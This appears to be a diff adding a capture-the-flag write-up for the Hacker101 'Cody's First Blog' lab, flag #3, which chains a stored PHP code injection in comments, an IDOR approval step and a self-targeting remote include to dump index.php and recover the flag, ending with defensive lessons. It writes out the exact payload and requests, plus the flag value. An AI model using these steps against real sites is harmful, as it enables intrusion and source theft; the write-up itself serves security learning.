@@ -1,0 +1,73 @@
+================================
+LAB: Cody's First Blog - FLAG #3
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 15, 2026
+Lab URL: https://868c57e9406a8f440011476736aa1cd8.ctf.hacker101.com
+Category: Web Security
+Level: Moderate
+Objective: Find hidden flags through web vulnerabilities
+Description: PHP blog application with comment system and admin panel
+
+[RECONNAISSANCE]
+----------------
+From previous flags, identified:
+- LFI vulnerability with page parameter
+- Null byte injection works (%00 bypasses .php extension)
+- allow_url_include is enabled (confirmed by HTTP error attempting localhost)
+- Comment system stores user input in database
+- Comments display on pages after approval via admin.inc
+
+Key errors during testing:
+- include(http://127.0.0.1/.php): failed to open stream: HTTP/1.1 403 Forbidden
+Confirms SSRF capability - server makes HTTP requests to itself.
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Two vulnerabilities chain together:
+1. Stored PHP Injection - comments accept PHP code without sanitization
+2. SSRF via allow_url_include - page parameter accepts http:// URLs
+
+When page is included via http://127.0.0.1/, comments are fetched from database and rendered.
+PHP code in comments executes in this context.
+
+[EXPLOITATION]
+--------------
+Step 1 - Inject PHP payload in comment:
+POST / HTTP/2
+Content-Type: application/x-www-form-urlencoded
+
+body=<?php echo file_get_contents('index.php'); ?>
+
+Step 2 - Approve comment (IDOR from FLAG #1):
+GET /?page=admin.inc&approve=X
+
+Replace X with comment ID from admin panel.
+
+Step 3 - Trigger SSRF to execute injected code:
+GET /?page=http://127.0.0.1/ HTTP/2
+
+Server includes itself via HTTP, PHP comment executes, index.php source code rendered.
+
+[EVIDENCE]
+----------
+Response contains full source code of index.php including:
+<?php
+	// ^FLAG^3e123c327eeb5c3abfec93def3c7b23cf9f5b3861727895bca87ed92d8b767b4$FLAG$
+	mysql_connect("localhost", "root", "");
+	[...rest of source code...]
+?>
+
+FLAG #3: ^FLAG^3e123c327eeb5c3abfec93def3c7b23cf9f5b3861727895bca87ed92d8b767b4$FLAG$
+
+Flag was hidden as PHP comment in index.php line 2.
+
+[LESSONS LEARNED]
+-----------------
+- Disable allow_url_include in production (php.ini: allow_url_include=Off)
+- Never trust user input - sanitize/escape ALL data before storage/display
+- Chaining multiple vulnerabilities (SSRF + Stored Injection) enables complex attacks
+- SSRF to localhost bypasses external network restrictions
+- Sensitive data (flags, credentials) should never be in source code - use environment variables
